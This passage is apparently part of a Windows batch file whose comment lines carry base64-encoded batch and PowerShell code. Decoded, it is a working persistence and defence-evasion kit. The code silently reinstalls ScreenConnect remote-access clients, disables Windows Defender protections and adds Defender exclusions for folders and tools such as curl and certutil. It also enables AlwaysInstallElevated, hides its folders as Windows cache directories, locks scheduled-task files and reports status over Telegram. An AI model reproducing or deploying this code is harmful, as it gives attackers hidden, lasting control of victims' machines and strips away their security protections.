::TVNJX1NBRkUlIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFs
::bHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsLmxvZyIgPm51bCAyPiYxDQpz
::ZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KZWNobyBbJVRBRyVdIG1zaWV4ZWMg
::ZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCmlmICIhTVNJRVhJVCEiPT0iMTYxOCIg
::KA0KICBlY2hvIFslVEFHJV0gbXNpX2J1c3lfcmV0cnk+PiIlTE9HJSINCiAgdGlt
::ZW91dCAvdCAzMCAvbm9icmVhayA+bnVsDQogIG1zaWV4ZWMgL2kgIiVNU0lfU0FG
::RSUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHBy
::ZXNzIC9MKnYgIiVXRCVcbXNpX2hlYWwyLmxvZyIgPm51bCAyPiYxDQogIHNldCAi
::TVNJRVhJVD0hRVJST1JMRVZFTCEiDQogIGVjaG8gWyVUQUclXSBtc2lleGVjX3Jl
::dHJ5IGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQopDQppZiAvSSBub3QgIiVNU0lf
::U0FGRSUiPT0iJU1TSSUiIGRlbCAvZiAvcSAiJU1TSV9TQUZFJSIgPm51bCAyPiYx
::DQpjYWxsIDpXYWl0U3ZjDQpjYWxsIDpSZXN0b3JlQWx0DQpyZW0gTzM3OiBzZXZy
::eiAvaSBzaGFyZXMgbGVnYWN5IFVwZ3JhZGVDb2RlcyB3aXRoIGdyeXhhIOKAlCBh
::bHdheXMgcmUtZW5zdXJlIEdyeXhhIGFmdGVyDQpjYWxsIDpFbnN1cmVHcnl4YU11
::c3QNCmV4aXQgL2IgMA0KDQo6UmVwYWlyUmVnaXN0ZXJlZA0KcmVtICUxPWZpbmdl
::cnByaW50IC0gc2VydmljZSBkZWxldGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVyZWQ6
::IHJlcGFpciBieSBHVUlELg0KcmVtIE00MDogbGFiZWwgd2FzIGFtcHV0YXRlZCAo
::Ym9keSBzYXQgYWZ0ZXIgSW5zdGFsbE1zaSBleGl0IC9iKSBzbyBwcmltYXJ5IGhl
::YWwgbmV2ZXIgcmFuLg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::fjEpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgZXhpdCAvYiAwDQpp
::ZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGV4aXQgL2IgMQ0KcG93ZXJz
::aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
::IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIg
::LUZwICIlfjEiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KY2FsbCA6
::V2FpdFN2Yw0KZXhpdCAvYiAwDQoNCjpSZXN0b3JlQWx0DQpyZW0gQUxUIHNlcnZp
::Y2UgZ29uZSBidXQgc3RpbGwgcmVnaXN0ZXJlZCAoU0MtZmFtaWx5IG1zaWV4ZWMg
::c2lkZSBlZmZlY3QpIC0gcmVwYWlyIGl0IHRvby4NCnNjIHF1ZXJ5ICJTY3JlZW5D
::b25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJv
::cmxldmVsIDEgZXhpdCAvYiAwDQplY2hvIGFsdCBtaXNzaW5nIC0gcmVwYWlyIGF0
::dGVtcHQ+PiIlTE9HJSINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dl
::cnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
::Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFp
::ciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEN
::CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZp
::bmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRf
::T0s9MSINCmV4aXQgL2IgMA0KDQo6Tm9Nc2lQb2xpY3kNCnJlZyBkZWxldGUgIkhL
::TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVy
::IiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGRlbGV0ZSAiSEtDVVxT
::T0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92
::IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmV4aXQgL2IgMA0K
::DQo6V2FpdFN2Yw0Kc2V0ICJUUklFUz0wIg0KOldhaXRMb29wDQpzYyBxdWVyeSAi
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklO
::RyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiSU5TVEFMTEVE
::PTEiDQogIHNldCAiUFJJTV9PSz0xIg0KICBleGl0IC9iIDANCikNCnNldCAvYSBU
::UklFUys9MQ0KaWYgJVRSSUVTJSBHRVEgMTAgZXhpdCAvYiAxDQpwaW5nIDEyNy4w
::LjAuMSAtbiA3ID5udWwgMj4mMQ0KZ290byA6V2FpdExvb3ANCg0KOlRnU3RhdGUN
::CnNldCAiTkVXU1RBVEU9JX4xIg0Kc2V0ICJNU0c9JX4yIg0Kc2V0ICJPTERTVEFU
::RT0iDQppZiBleGlzdCAiJVNUQVRFJSIgc2V0IC9wIE9MRFNUQVRFPTwiJVNUQVRF
::JSINCnJlbSBmYWxzZSBET1dOIGFmdGVyIHJlYm9vdCByYWNlOiBwcmltYXJ5IGFs
::cmVhZHkgUnVubmluZyDigJQgZG8gbm90IHNwYW0NCmlmIC9JICIlTkVXU1RBVEUl
::Ij09IkRPV04iICgNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::S0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVycm9y
::bGV2ZWwgMSAoDQogICAgZWNobyB0Z19za2lwX2Rvd25fYWxyZWFkeV9ydW5uaW5n
::Pj4iJUxPRyUiDQogICAgZXhpdCAvYiAwDQogICkNCikNCnJlbSByYXRlLWxpbWl0
::IHJlcGVhdGVkIERPV04vRkFJTDogbWF4IDEgYWxlcnQgcGVyIDZoIHdoaWxlIHN0
::dWNrDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJET1dOIiBnb3RvIDpNYXliZVN1cHBy
::ZXNzDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJGQUlMIiBnb3RvIDpNYXliZVN1cHBy
::ZXNzDQpnb3RvIDpTZW5kQWxlcnQNCjpNYXliZVN1cHByZXNzDQppZiAvSSAiJU5F
::V1NUQVRFJSI9PSIlT0xEU1RBVEUlIiBpZiBleGlzdCAiJVdEJVx0Z19zZW50LmZs
::YWciICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::Q29tbWFuZCAiaWYoKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1MaXRl
::cmFsUGF0aCAnJVdEJVx0Z19zZW50LmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3Rh
::bE1pbnV0ZXMgLWx0IDM2MCl7ZXhpdCAwfWVsc2V7ZXhpdCAxfSIgPm51bCAyPiYx
::DQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gdGdfc3VwcHJlc3Nl
::ZF8lTkVXU1RBVEUlPj4iJUxPRyUiDQogICAgZXhpdCAvYiAwDQogICkNCikNCjpT
::ZW5kQWxlcnQNCmVjaG8gJU5FV1NUQVRFJT4iJVNUQVRFJSINCmVjaG8gc2VudD4i
::JVdEJVx0Z19zZW50LmZsYWciDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
::dGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXHRn
::X3JlcG9ydC5wczEiIC1TdGF0ZSAlTkVXU1RBVEUlIC1TdW1tYXJ5ICIlTVNHJSIg
::LUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09VTlQlID5udWwgMj4mMQ0KZWNobyB0
::ZyBzdGF0ZSAlTkVXU1RBVEUlIHNlbnQ+PiIlTE9HJSINCmV4aXQgL2IgMA0K
::B64_MON_END
::B64_SEC_BEGIN
::QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwNFMxMyAtIHNl
::dnJ6LmNmZyArIGdyeXhhLmNmZyBkeW5hbWljIEZQczsgU1kgREVMRVRFK1dSSVRF
::X0RBQw0Kc2V0bG9jYWwgRW5hYmxlRXh0ZW5zaW9ucyBFbmFibGVEZWxheWVkRXhw
::YW5zaW9uDQpzZXQgIldEPSVQcm9ncmFtRGF0YSVcTWljcm9zb2Z0XFdpbmRvd3Nc
::V0VSXFRlbXBcLnd1Y2FjaGUiDQpzZXQgIldEMj0lUHJvZ3JhbURhdGElXE1pY3Jv
::c29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxi
::b290LmVyciINCnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VF
::UDI9Zjg2MWM4MTQwZDQ1MzQyNyINCnNldCAiS0VFUDM9MzZlNTA2ZmYwMTZiMjE1
::MSINCmlmIGV4aXN0ICIlV0QlXHNldnJ6LmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0
::b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXHNldnJ6LmNmZyIpIGRv
::ICgNCiAgaWYgL0kgIiUlSyI9PSJQUklNQVJZX0ZQIiBzZXQgIktFRVAxPSUlTCIN
::CiAgaWYgL0kgIiUlSyI9PSJBTFRfRlAiIHNldCAiS0VFUDI9JSVMIg0KKQ0KaWYg
::ZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0x
::LCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kg
::IiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIktFRVAzPSUlTCINCnNldCAiUFJJTT1T
::Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiDQpzZXQgIkFMVD1TY3JlZW5D
::b25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQpzZXQgIkdSWVhBPVNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dyYW1GaWxlcyUiDQpz
::ZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9JVN5
::c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUi
::IG1rZGlyICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1r
::ZGlyICIlV0QyJSIgPm51bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUg
::JVRJTUUlIFMxMz4+IiVMT0clIg0KDQpSRU0gLS0tIE5ldXRyYWxpemUgTVNJIGJs
::b2NrIHBvbGljaWVzICgxNjI1KSAtLS0NClJFTSBEaXNhYmxlTVNJOiAwPWFsbG93
::LCAxPW5vbi1hZG1pbiBvbmx5LCAyPWFsbCAtPiBmb3JjZSAwDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxl
::ciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
::d3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxsRWxldmF0ZWQgL3QgUkVHX0RX
::T1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgZGVsZXRlICJIS0NVXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLQ1VcU09GVFdBUkVcUG9saWNp
::ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxs
::RWxldmF0ZWQgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQoNClJFTSAt
::LS0gRGVmZW5kZXI6IHJlZ2lzdHJ5IGV4Y2x1c2lvbnMgKHBvbGljeSArIHByZWZl
::cmVuY2Uga2V5cykgLS0tDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVz
::XE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlQW50aVNweXdh
::cmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJl
::YWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5n
::IC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
::LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZyAv
::dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09G
::VFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1U
::aW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVJT0FWUHJvdGVjdGlvbiAvdCBSRUdf
::RFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::UG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFBy
::b3RlY3Rpb24iIC92IERpc2FibGVTY3JpcHRTY2FubmluZyAvdCBSRUdfRFdPUkQg
::L2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRCUi
::IC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBh
::dGhzIiAvdiAiJVdEMiUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0K
::cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
::clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiQzpcV2luZG93c1xUZW1wIiAvdCBSRUdf
::RFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3Yg
::IiVURU1QJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
::ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
::c2lvbnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
::UDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lv
::bnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIl
::KSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNc
::UGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIg
::L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
::RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0
::aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgL3QgUkVHX0RXT1JE
::IC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQg
::L2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiIC90IFJFR19EV09SRCAv
::ZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIgL3QgUkVHX0RXT1JEIC9k
::IDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29m
::dFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVc
::U2NyZWVuQ29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
::IDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1cmwuZXhlIGNtZC5leGUg
::cG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3QuQ2xpZW50
::U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8g
::KA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERl
::ZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdP
::UkQgL2QgMCAvZiA+bnVsIDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2
::ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4gcmVnIGFsb25lKSAtLS0NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZl
::cmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFBy
::ZWZlcmVuY2UgLURpc2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1N
::cFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1w
::UHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlfUNhdGNoe307
::IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xUZW1w
::JywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQqJywnJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50KicpOyIgXg0KICAidHJ5eyRwYXRocys9QChH
::ZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZpbGVzIC1GaWx0ZXIgJ1Nj
::cmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZvckVhY2gt
::T2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9
::W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7
::IGlmKCRwZjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAt
::RmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAg
::fCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAg
::ImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkp
::eyBpZigkcCl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVB
::IDAgfSB9OyIgXg0KICAiZm9yZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1
::cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhlJywnY2VydHV0aWwuZXhl
::JywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVlbkNvbm5l
::Y3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
::c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2Ug
::LUV4Y2x1c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIg
::Pm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0
::cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUi
::DQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRlIHdvcmtkaXJz
::ICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
::dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6
::IGRvIE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0g
::Y29weS9tb3ZlIG92ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBh
::bmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBk
::aXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAlJUYgaW4gKHBrZy5t
::c2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0KICBp
::ZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
::Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJk
::ZXIgdG8gZGVsZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBj
::b250YWluIHNwYWNlcyAoIlNlcnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBG
::T1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJiYWdlIHRva2Vucy4gUG93
::ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVhZC4NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYo
::VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0
::LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlkZW50aXR5LmNmZycgLUZvcmNl
::IHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNLX1tBLURdPSgu
::KykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
::JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywn
::UGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJl
::cycpIH07IiBeDQogICJmb3JlYWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1Q
::YXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAk
::Zil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8IE91dC1OdWxsOyAm
::IGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06Ricg
::J0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIu
::ZXhlICtoICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0t
::LSBBQ0w6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIp
::IC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9vdCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0
::b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06RiIgPm51bCAyPiYxDQoN
::ClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0IGluc3Rh
::bGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBi
::cmVha3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJ
::TkUNClJFTSB3aGlsZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVu
::ZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3
::OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBidWlsZCBMb2NrRGlyJ2QgdGhl
::c2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxhZyIgKA0KICBm
::aW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
::ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5s
::b2NrX3ByaW9yX2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAg
::ICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAg
::ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSINCiAgICAgICIl
